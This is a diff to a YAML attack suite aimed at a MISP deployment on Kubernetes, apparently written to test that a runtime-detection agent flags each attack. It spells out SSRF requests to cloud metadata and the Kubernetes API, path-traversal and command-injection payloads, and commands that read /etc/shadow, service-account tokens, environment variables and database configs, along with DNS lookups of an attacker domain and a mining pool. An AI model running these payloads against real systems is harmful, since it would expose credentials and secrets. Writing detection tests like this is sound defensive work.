@@ -5,10 +5,10 @@ metadata:
   description: >-
     Attack suite for MISP (Malware Information Sharing Platform).
     MISP runs nginx + PHP-FPM + supervisord on Debian, serving HTTPS on 443.
-    Attacks exploit SSRF (feed URL fetching), SQL injection on search/filter
-    endpoints, and command injection via REST API object attributes.
-    Uses protocol: https → bobctl deploys a test pod and executes attacks
-    via kubectl exec curl (bypasses K8s API proxy limitations).
+    HTTP attacks probe the web interface via a test pod (curl exec).
+    Exec attacks simulate post-exploitation inside the MISP container —
+    the attacker has code execution and runs commands that node-agent
+    should detect as anomalous vs the learned ApplicationProfile.
 target:
   service: misp
   namespace: misp
@@ -16,11 +16,14 @@ target:
   protocol: https
 
 attacks:
-  # ─── SSRF: Feed URL fetching (MISP fetches threat intel feeds from URLs) ──
-  # The /feeds endpoint can be tricked into making server-side requests to
-  # internal cluster services.
+  # ═══════════════════════════════════════════════════════════════════════
+  # HTTP attacks (via test pod curl → MISP HTTPS endpoint)
+  # These probe the web surface. Detection depends on MISP's PHP code
+  # making unexpected syscalls in response.
+  # ═══════════════════════════════════════════════════════════════════════
 
-  - name: ssrf-cluster-metadata
+  # ─── SSRF: Feed URL fetching ─────────────────────────────────────────
+  - name: ssrf-cloud-metadata
     type: ssrf
     http:
       method: POST
@@ -30,31 +33,19 @@ attacks:
       body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - attackType: ssrf
-        ruleID: R0005
-        ruleName: "Unexpected domain request"
-        containerName: misp
 
-  - name: ssrf-internal-service
+  - name: ssrf-internal-k8s-api
     type: ssrf
     http:
       method: POST
       path: /feeds/previewIndex
       headers:
         Content-Type: application/x-www-form-urlencoded
-      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2Fstorage.honey.svc.cluster.local%3A8443%2Fapis"
+      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2Fkubernetes.default.svc%2Fapis"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - attackType: ssrf
-        ruleID: R0005
-        ruleName: "Unexpected domain request"
-        containerName: misp
 
-  # ─── SQL Injection: Search/filter endpoints ────────────────────────────
-  # MISP's CakePHP-based search endpoints pass user input to SQL queries.
-
+  # ─── SQL Injection probes ────────────────────────────────────────────
   - name: sqli-events-search
     type: sqli
     http:
@@ -66,13 +57,8 @@ attacks:
         Accept: application/json
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - attackType: sqli
-        ruleID: R0001
-        ruleName: "Unexpected process launched"
-        containerName: misp
 
-  - name: sqli-attributes-search
+  - name: sqli-attributes-union
     type: sqli
     http:
       method: GET
@@ -84,9 +70,7 @@ attacks:
     successIndicators:
       - statusCode: 200
 
-  # ─── LFI: Path traversal via REST API ─────────────────────────────────
-  # Attempt to read sensitive files through improperly validated path parameters.
-
+  # ─── LFI: Path traversal via REST API ────────────────────────────────
   - name: lfi-etc-passwd
     type: lfi
     http:
@@ -94,11 +78,6 @@ attacks:
       path: /events/view/../../../../../../etc/passwd
     successIndicators:
       - bodyContains: "root:"
-    expectedDetections:
-      - attackType: lfi
-        ruleID: R0010
-        ruleName: "Unexpected Sensitive File Access"
-        containerName: misp
 
   - name: lfi-sa-token
     type: lfi
@@ -107,45 +86,21 @@ attacks:
       path: /events/view/../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
     successIndicators:
       - bodyContains: "eyJ"
-    expectedDetections:
-      - attackType: lfi
-        ruleID: R0006
-        ruleName: "Unexpected Service Account Token Access"
-        containerName: misp
 
-  # ─── Command Injection: Object attribute values (MISP processes attributes) ─
-  # MISP processes indicator values (IPs, domains, filenames). Malicious
-  # attributes can inject commands in worker processes.
+  # ═══════════════════════════════════════════════════════════════════════
+  # Exec attacks (kubectl exec into MISP container)
+  # These simulate post-exploitation — the attacker has a shell in the
+  # MISP container and runs commands that were NOT in the baseline profile.
+  # Node-agent eBPF probes detect unexpected execve(), openat(), DNS, etc.
+  # ═══════════════════════════════════════════════════════════════════════
 
-  - name: cmdinject-attribute-value
+  # ─── Unexpected Process: whoami (R0001) ──────────────────────────────
+  - name: exec-whoami
     type: cmdinject
-    http:
-      method: POST
-      path: /attributes/add/0
-      headers:
-        Content-Type: application/json
-        Accept: application/json
-      body: '{"request":{"Attribute":{"type":"filename","value":"; cat /etc/shadow","category":"Payload delivery","to_ids":false}}}'
+    exec:
+      command: ["whoami"]
     successIndicators:
-      - statusCode: 200
-    expectedDetections:
-      - attackType: cmdinject
-        ruleID: R0010
-        ruleName: "Unexpected Sensitive File Access"
-        containerName: misp
-        command: cat
-
-  - name: cmdinject-enrichment
-    type: cmdinject
-    http:
-      method: POST
-      path: /attributes/add/0
-      headers:
-        Content-Type: application/json
-        Accept: application/json
-      body: '{"request":{"Attribute":{"type":"ip-dst","value":"127.0.0.1;whoami","category":"Network activity","to_ids":false}}}'
-    successIndicators:
-      - statusCode: 200
+      - responseContains: "root"
     expectedDetections:
       - attackType: cmdinject
         ruleID: R0001
@@ -153,27 +108,195 @@ attacks:
         containerName: misp
         command: whoami
 
-expectedDetections:
-  # DNS anomaly from SSRF feeds fetching external/internal URLs
-  - attackType: ssrf
-    ruleID: R0005
-    ruleName: "Unexpected domain request"
-    containerName: misp
+  # ─── Unexpected Process: id (R0001) ──────────────────────────────────
+  - name: exec-id
+    type: cmdinject
+    exec:
+      command: ["id"]
+    successIndicators:
+      - responseContains: "uid="
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+        command: id
 
-  # Unexpected process from command injection
+  # ─── Sensitive File Access: /etc/shadow (R0010) ──────────────────────
+  - name: exec-read-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0010
+        ruleName: "Unexpected Sensitive File Access"
+        containerName: misp
+        command: cat
+
+  # ─── SA Token Access (R0006) ─────────────────────────────────────────
+  - name: exec-sa-token
+    type: cmdinject
+    exec:
+      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+    successIndicators:
+      - responseContains: "eyJ"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0006
+        ruleName: "Unexpected Service Account Token Access"
+        containerName: misp
+        command: cat
+
+  # ─── Read /etc/passwd (R0001 + R0010) ────────────────────────────────
+  - name: exec-read-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/passwd"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+        command: cat
+
+  # ─── DNS Anomaly: resolve evil domain (R0005) ───────────────────────
+  - name: exec-dns-anomaly
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts evil.attacker.example.com 2>&1 || echo dns_done"]
+    successIndicators:
+      - responseContains: "dns_done"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── Crypto Mining Domain DNS (R1008) ──────────────────────────────
+  - name: exec-crypto-dns
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done"]
+    successIndicators:
+      - responseContains: "mining_dns_done"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R1008
+        ruleName: "Crypto Mining Domain Communication"
+        containerName: misp
+
+  # ─── Drifted Binary Execution (R1001) ──────────────────────────────
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_misp && /tmp/drifted_misp /etc 2>&1; rm -f /tmp/drifted_misp"]
+    successIndicators:
+      - responseContains: "passwd"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R1001
+        ruleName: "Drifted process executed"
+        containerName: misp
+        command: drifted_misp
+
+  # ─── Execution from /dev/shm (R1000) ──────────────────────────────
+  - name: exec-from-devshm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious"]
+    successIndicators:
+      - responseContains: "pwned"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R1000
+        ruleName: "Process executed from malicious source"
+        containerName: misp
+
+  # ─── Read /proc/1/environ (R0008) ─────────────────────────────────
+  - name: exec-read-environ
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -3 || echo no_environ"]
+    successIndicators:
+      - responseContains: "="
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0008
+        ruleName: "Read Environment Variables from procfs"
+        containerName: misp
+        command: cat
+
+  # ─── Symlink over sensitive file (R1010) ───────────────────────────
+  - name: exec-symlink-shadow
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link 2>&1 && cat /tmp/shadow_link 2>/dev/null; rm -f /tmp/shadow_link"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R1010
+        ruleName: "Soft link created over sensitive file"
+        containerName: misp
+
+  # ─── MISP-specific: read database config (R0010) ──────────────────
+  - name: exec-read-db-config
+    type: cmdinject
+    exec:
+      command: ["cat", "/var/www/MISP/app/Config/database.php"]
+    successIndicators:
+      - responseContains: "datasource"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0010
+        ruleName: "Unexpected Sensitive File Access"
+        containerName: misp
+        command: cat
+
+expectedDetections:
+  # Unexpected process from exec attacks
   - attackType: cmdinject
     ruleID: R0001
     ruleName: "Unexpected process launched"
     containerName: misp
 
-  # Sensitive file access from LFI or command injection
-  - attackType: lfi
+  # Sensitive file access from exec attacks
+  - attackType: cmdinject
     ruleID: R0010
     ruleName: "Unexpected Sensitive File Access"
     containerName: misp
 
-  # SA token access from LFI
-  - attackType: lfi
+  # SA token access
+  - attackType: cmdinject
     ruleID: R0006
     ruleName: "Unexpected Service Account Token Access"
+    containerName: misp
+
+  # DNS anomaly from exec DNS lookups
+  - attackType: cmdinject
+    ruleID: R0005
+    ruleName: "Unexpected domain request"
+    containerName: misp
+
+  # Drifted binary execution
+  - attackType: cmdinject
+    ruleID: R1001
+    ruleName: "Drifted process executed"
+    containerName: misp
+
+  # Execution from malicious source
+  - attackType: cmdinject
+    ruleID: R1000
+    ruleName: "Process executed from malicious source"
+    containerName: misp
+
+  # Crypto mining DNS
+  - attackType: cmdinject
+    ruleID: R1008
+    ruleName: "Crypto Mining Domain Communication"
     containerName: misp
